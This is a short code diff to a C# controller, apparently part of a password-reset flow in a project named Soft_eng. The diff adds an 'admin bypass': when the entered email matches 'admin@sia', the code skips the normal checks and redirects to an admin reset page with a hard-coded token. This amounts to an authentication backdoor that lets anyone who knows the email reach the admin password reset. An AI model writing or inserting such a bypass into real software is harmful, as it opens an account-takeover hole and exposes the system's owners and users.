@@ -246,6 +246,12 @@ namespace Soft_eng.Controllers
 
             string normalizedEmail = email.Trim();
 
+            // admin bypass
+            if (string.Equals(normalizedEmail, "admin@sia", StringComparison.OrdinalIgnoreCase))
+            {
+                return RedirectToAction("ResetPasswordAdmin", new { token = "internal-admin-bypass", email = normalizedEmail });
+            }
+
             try
             {
                 await _connection.OpenAsync();
